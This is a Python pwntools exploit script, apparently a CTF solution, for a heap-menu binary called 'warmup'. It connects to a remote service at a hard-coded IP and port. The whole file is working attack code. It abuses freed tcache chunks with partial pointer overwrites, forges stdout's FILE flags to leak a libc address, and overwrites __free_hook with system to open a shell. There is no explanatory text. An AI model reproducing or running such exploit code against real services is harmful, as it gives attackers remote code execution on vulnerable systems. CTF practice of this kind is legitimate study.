#coding=utf-8
from pwn import *
local = 0
exec_file="./warmup"
context.binary=exec_file
context.terminal=["tmux","splitw","-h"]
elf=ELF(exec_file)
if local :
    a=process(exec_file)
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
else:
    a=remote("47.52.90.3","9999")
    libc=ELF("./libc-2.27.so")
def get_base(a):
    text_base = a.libs()[a._cwd+a.argv[0].strip('.')]
    for key in a.libs():
        if "libc.so.6" in key:
            return text_base,a.libs()[key]
def debug():
    text_base,libc_base=get_base(a)
    script="set $text_base="+str(text_base)+'\n'+"set $libc_base="+str(libc_base)+'\n'
    script+='''
    b *($text_base+0x000000000000C71)
    b *($text_base+0x000000000000D66)
    b *($text_base+0x000000000000E27)
    '''
    gdb.attach(a,script)

def menu(idx):
    a.sendlineafter(">>",str(idx))
def add(content):
    menu(1)
    a.sendafter("content>>",content)
def delete(idx):
    menu(2)
    a.sendlineafter("x:",str(idx))
def edit(idx,content):
    menu(3)
    a.sendlineafter("ex:",str(idx))
    a.sendafter(">>",content)

add('A')#0
add('A')#1
add('A')#2
add('A')#3
edit(0,'A')# ptr = 0
delete(4)
delete(4)
#debug()
edit(0,'\xb0')
#debug()
add('A')#4
#delete(1)

add(p64(0)+p64(0xa1))#5
edit(1,'A')# ptr = chunk_1
for i in range(8):
    delete(6)
#debug()
edit(1,'\x60\x27')
delete(3)
edit(4,'A')

delete(6)
delete(6)
edit(4,'\xc0')
#debug()
#debug()
add('A')#3
add('A')#6
#debug()
add(p64(0xfbad1800)+p64(0)*3+'\x00')#7
a.recvuntil(p64(0xfbad1800))
a.recvuntil("\x7f")
libc_base=u64(a.recvuntil("\x7f")[-6:]+'\x00\x00')-131-libc.symbols["_IO_2_1_stdout_"]
print hex(libc_base)
__free_hook=libc_base+libc.symbols["__free_hook"]
system_addr=libc_base+libc.symbols["system"]
#debug()
edit(3,'A')
delete(9)
edit(3,p64(__free_hook-8))
add('A')#8
add("/bin/sh\x00"+p64(system_addr))#9
delete(9)
a.interactive()










